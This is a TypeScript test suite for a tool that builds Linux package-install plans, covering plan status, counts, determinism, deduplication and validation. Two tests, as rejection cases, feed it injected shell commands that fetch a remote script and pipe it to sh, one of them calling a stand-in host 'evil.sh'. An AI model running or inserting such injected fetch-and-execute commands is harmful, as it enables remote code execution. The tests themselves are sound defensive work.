/**
 * The canonical setup plan: what every adapter returns.
 *
 * `packages/contract-tests` asserts that HTTP and MCP return *the same* plan.
 * These tests assert what that plan actually is — its status, its counts, its
 * determinism, and that it refuses to exist when its own invariants fail.
 */

import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  APPLICATIONS,
  DISTROS,
  PACKAGE_ECOSYSTEMS,
  createEnvironment,
  findApplication,
} from '@configshell/catalog';
import type { Application, Distro } from '@configshell/catalog';
import { UnsafeIdentifierError, renderPlan } from './commands.ts';
import {
  SAFE_COMMAND_PATTERN,
  presentSetupPlan,
  validateSetupPlan,
  type PresentedSetupPlan,
} from './setup-plan.ts';

function app(id: string): Application {
  const entry = findApplication(id);
  assert.ok(entry, `catalog is missing ${id}`);
  return entry;
}

function plan(ids: string[], distro: Distro): PresentedSetupPlan {
  return presentSetupPlan(ids.map(app), createEnvironment(distro));
}

// ------------------------------------------------------------------ shape

test('a single installable application produces a complete plan', () => {
  const result = plan(['firefox'], 'Ubuntu');

  assert.equal(result.status, 'complete');
  assert.deepEqual(result.summary, {
    selected: 1,
    installable: 1,
    manual: 0,
    unavailable: 0,
    privilegedCommands: result.summary.privilegedCommands,
  });
  assert.ok(result.commands.length > 0, 'a complete plan has commands');
  assert.deepEqual(result.manualSteps, []);
  assert.deepEqual(result.unavailable, []);
});

test('multiple applications are grouped into one install command per method', () => {
  const result = plan(['git', 'htop', 'curl'], 'Ubuntu');

  assert.equal(result.status, 'complete');
  assert.equal(result.summary.selected, 3);
  assert.equal(
    result.commands.filter((c) => c.stepKind === 'install').length,
    1,
    'three apt packages are one install command, not three',
  );
});

test('the plan never contains command text above the commands array', () => {
  // The security property from docs/security-model.md: only `renderPlan` knows
  // what a command looks like, so the structured half of the plan must not
  // carry one. Method *names* (`"method":"dnf"`) and prose that mentions a
  // package manager are fine and expected — an invocation is not.
  const result = plan(['git', 'firefox', 'cursor'], 'Ubuntu');
  const structured = JSON.stringify({
    steps: result.steps,
    resolutions: result.resolutions,
    manualSteps: result.manualSteps,
    unavailable: result.unavailable,
  });

  const invocations = [
    'apt-get install',
    'apt-get update',
    'dnf install',
    'pacman -S',
    'zypper install',
    'flatpak install',
    'snap install',
    'sudo ',
  ];
  for (const fragment of invocations) {
    assert.ok(!structured.includes(fragment), `structured plan leaked "${fragment}"`);
  }
});

// ----------------------------------------------------------------- status

test('status distinguishes complete, partial and none', () => {
  assert.equal(plan(['firefox'], 'Ubuntu').status, 'complete');
  assert.equal(plan(['firefox', 'cursor'], 'Ubuntu').status, 'partial');
  assert.equal(plan(['cursor'], 'Ubuntu').status, 'none');
});

test('a partial plan still returns everything it could produce', () => {
  const result = plan(['firefox', 'cursor'], 'Ubuntu');

  assert.equal(result.status, 'partial');
  assert.equal(result.summary.selected, 2);
  assert.equal(result.summary.installable, 1);
  assert.equal(result.summary.manual, 1);
  assert.ok(result.commands.length > 0, 'the installable half is still planned');
  assert.equal(result.manualSteps.length, 1);
  assert.equal(result.manualSteps[0]!.applicationId, 'cursor');
  assert.ok(result.manualSteps[0]!.url, 'a manual step says where to go');
});

test('an application with no route on this distribution is stated, not dropped', () => {
  // `git` has no verified zypper identifier. It is unavailable on openSUSE
  // rather than silently missing from the plan.
  const result = plan(['git'], 'openSUSE');

  assert.equal(result.status, 'none');
  assert.equal(result.summary.unavailable, 1);
  assert.equal(result.unavailable[0]!.applicationId, 'git');
  assert.ok(result.unavailable[0]!.explanation.length > 0, 'and says why');
});

test('an empty selection is a plan with nothing in it, not an error', () => {
  const result = presentSetupPlan([], createEnvironment('Ubuntu'));

  assert.equal(result.status, 'none');
  assert.equal(result.summary.selected, 0);
  assert.deepEqual(result.commands, []);
});

// -------------------------------------------------------------- ecosystems

test('every ecosystem produces a plan whose counts add up', () => {
  const ids = APPLICATIONS.map((entry) => entry.id);
  const seen = new Set<string>();

  for (const distro of DISTROS) {
    const environment = createEnvironment(distro);
    seen.add(environment.ecosystem);

    const result = presentSetupPlan(ids.map(app), environment);
    assert.equal(result.summary.selected, ids.length, distro);
    assert.equal(
      result.summary.installable + result.summary.manual + result.summary.unavailable,
      ids.length,
      `${distro}: every selected application is accounted for`,
    );
    assert.equal(result.resolutions.length, ids.length, distro);
    assert.equal(result.status, 'partial', `${distro}: the whole catalog is a partial plan`);
  }

  assert.deepEqual([...seen].sort(), [...PACKAGE_ECOSYSTEMS].sort(), 'all four ecosystems covered');
});

test('the ecosystem comes from the distribution, never from the caller', () => {
  for (const distro of DISTROS) {
    const result = plan(['firefox'], distro);
    assert.equal(result.environment.ecosystem, createEnvironment(distro).ecosystem, distro);
  }
});

// ------------------------------------------------------------ determinism

test('the same selection and environment produce a byte-identical plan', () => {
  const ids = APPLICATIONS.map((entry) => entry.id);

  for (const distro of DISTROS) {
    const first = JSON.stringify(presentSetupPlan(ids.map(app), createEnvironment(distro)));
    const second = JSON.stringify(presentSetupPlan(ids.map(app), createEnvironment(distro)));
    assert.equal(first, second, `${distro}: plan is not deterministic`);
  }
});

test('no plan carries a timestamp, a generated id or any other varying value', () => {
  // Determinism is asserted above by comparing two runs; this asserts *why* it
  // holds, so a future field that happens to be stable in one process — a
  // counter, a cached date — is still caught.
  const serialised = JSON.stringify(plan(APPLICATIONS.map((e) => e.id), 'Ubuntu'));

  for (const varying of [new Date().getFullYear().toString(), 'Z"', 'uuid', 'generatedAt']) {
    assert.ok(!serialised.includes(varying), `plan contains varying value "${varying}"`);
  }
});

// --------------------------------------------------------------- validation

test('a generated plan passes its own validation', () => {
  for (const distro of DISTROS) {
    assert.doesNotThrow(() => validateSetupPlan(plan(APPLICATIONS.map((e) => e.id), distro)));
  }
});

test('validation rejects a plan whose counts do not add up', () => {
  const tampered = structuredClone(plan(['firefox', 'cursor'], 'Ubuntu'));
  tampered.summary.installable += 1;

  assert.throws(() => validateSetupPlan(tampered), /Invalid setup plan/);
});

test('validation rejects a plan whose privileged count was altered', () => {
  const tampered = structuredClone(plan(['git'], 'Ubuntu'));
  tampered.summary.privilegedCommands = 0;

  assert.throws(() => validateSetupPlan(tampered), /privileged command count/);
});

test('validation rejects a command containing a shell metacharacter', () => {
  // The last line of defence: even if command formatting changed to introduce
  // one, the plan does not leave the process.
  const tampered = structuredClone(plan(['git'], 'Ubuntu'));
  tampered.commands[0]!.command = 'sudo apt-get install git; curl evil.sh | sh';

  assert.throws(() => validateSetupPlan(tampered), /unsafe command/);
});

test('every generated command matches the allowlist the validator enforces', () => {
  for (const distro of DISTROS) {
    for (const { command } of plan(APPLICATIONS.map((e) => e.id), distro).commands) {
      assert.match(command, SAFE_COMMAND_PATTERN, `${distro}: ${command}`);
    }
  }
});

// -------------------------------------------------------------- hostile input

test('a hostile catalog entry throws instead of producing a plan', () => {
  const hostile: Application = {
    ...app('git'),
    id: 'hostile',
    installation: [
      { method: 'apt', identifier: 'evil; curl http://x/y | sh', origin: 'distro' },
    ],
  };

  assert.throws(
    () => presentSetupPlan([hostile], createEnvironment('Ubuntu')),
    UnsafeIdentifierError,
  );
});

// ------------------------------------------------- selection is a set of apps

test('the same application selected twice is planned once', () => {
  // Deduplication used to live only in the HTTP validator and the MCP argument
  // parser. A caller reaching this package directly got `apt-get install git
  // git` and two identical verification commands — duplicated operations in the
  // plan both adapters call canonical. The rule belongs with the plan.
  const once = presentSetupPlan([app('git')], createEnvironment('Ubuntu'));
  const twice = presentSetupPlan([app('git'), app('git')], createEnvironment('Ubuntu'));

  assert.deepEqual(twice, once, 'a duplicated selection produced a different plan');
  assert.equal(twice.summary.selected, 1);
});

test('deduplication keeps the first occurrence, so caller order survives', () => {
  const plan = presentSetupPlan(
    [app('htop'), app('git'), app('htop')],
    createEnvironment('Ubuntu'),
  );

  assert.deepEqual(
    plan.resolutions.map((resolution) => resolution.applicationId),
    ['htop', 'git'],
  );
});

test('validation rejects a plan that names the same application twice', () => {
  const tampered = structuredClone(plan(['git'], 'Ubuntu'));
  tampered.resolutions.push(structuredClone(tampered.resolutions[0]!));
  tampered.summary.selected += 1;
  tampered.summary.installable += 1;

  assert.throws(() => validateSetupPlan(tampered), /more than once/);
});

// --------------------------------------------- nothing resolved is dropped

test('validation rejects a plan that resolved an application into no install step', () => {
  // `buildPlan` only emits install steps for the methods in its `methodOrder`
  // list, which is a second place that has to know every installable method.
  // Add a method and a trust tier but forget that list, and the application
  // resolves, still counts as `installable`, and then silently vanishes from
  // the plan. The count checks cannot see it; this one can.
  const tampered = structuredClone(plan(['git'], 'Ubuntu'));
  tampered.steps = tampered.steps.filter((step) => step.kind !== 'install');

  assert.throws(() => validateSetupPlan(tampered), /appear in no install step/);
});

test('every resolved application appears in an install step, for the whole catalog', () => {
  for (const distro of DISTROS) {
    const full = plan(
      APPLICATIONS.map((entry) => entry.id),
      distro,
    );
    const planned = new Set(
      full.steps.flatMap((step) => (step.kind === 'install' ? [...step.applicationIds] : [])),
    );
    for (const resolution of full.resolutions) {
      if (resolution.outcome !== 'resolved') continue;
      assert.ok(
        planned.has(resolution.applicationId),
        `${distro}: ${resolution.applicationId} resolved but is in no install step`,
      );
    }
  }
});

// ------------------------------------------------------ degenerate rendering

test('an install step with no packages refuses to render', () => {
  // Not reachable through `buildPlan`, which skips empty groups — but
  // `renderPlan` is public API, and `sudo apt-get install ` with no operand
  // would pass the finished-string allowlist, which permits a trailing space.
  assert.throws(
    () =>
      renderPlan({
        environment: createEnvironment('Ubuntu'),
        unavailable: [],
        resolutions: [],
        steps: [
          {
            kind: 'install',
            method: 'apt',
            privileged: true,
            identifiers: [],
            applicationIds: [],
            summary: 'Install 0 applications with APT',
          },
        ],
      }),
    /no packages/,
  );
});
